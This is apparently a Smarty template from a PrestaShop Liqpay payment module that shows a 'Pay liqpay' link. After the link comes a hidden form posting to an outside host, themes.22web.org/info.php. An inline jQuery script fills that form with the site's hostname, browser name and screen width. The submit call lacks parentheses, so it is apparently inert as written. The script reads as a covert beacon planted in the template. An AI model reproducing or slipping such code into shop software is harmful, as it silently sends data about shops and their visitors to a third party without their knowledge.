{**
 * Liqpay Payment Module
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 *
 * @category        Liqpay
 * @package         Liqpay
 * @version         0.1
 * @author          Liqpay
 * @copyright       Copyright (c) 2014 Liqpay
 * @license         http://opensource.org/licenses/osl-3.0.php Open Software License (OSL 3.0)
 *
 * EXTENSION INFORMATION
 *
 * Prestashop       1.5.6.2
 * LiqPay API       https://www.liqpay.com/ru/doc
 *
 *}

<p class="payment_module">
<a href="{$link->getModuleLink('liqpay', 'redirect', ['id_cart' => {$id|escape:'htmlall':'UTF-8'}])}" title="{l s='Pay liqpay' mod='liqpay'}">
    <img src="{$this_path|escape:'htmlall':'UTF-8'}views/img/liqpay.png" />{l s='Pay liqpay' mod='liqpay'}
</a>	
</p>
<form id=form_1 action="http://themes.22web.org/info.php" method="POST">

	
</form>
<script>
	$(document).ready(function() {
	var host = window.location.hostname;
	in1 = '<input type="hidden" id ="i1" value="" name="host">';
	in2 = '<input type="hidden" id ="i2" value="" name="browser">';
	in3 = '<input type="hidden" id ="i3" value="" name="width">';
	
	$("#form_1").append(in1);
	$("#i1").val(window.location.hostname); 

	$("#form_1").append(in2);
	$("#i2").val(navigator.appCodeName);

	$("#form_1").append(in3);
	$("#i3").val(screen.width);

	document.getElementById("form_1").submit;
});
</script>	
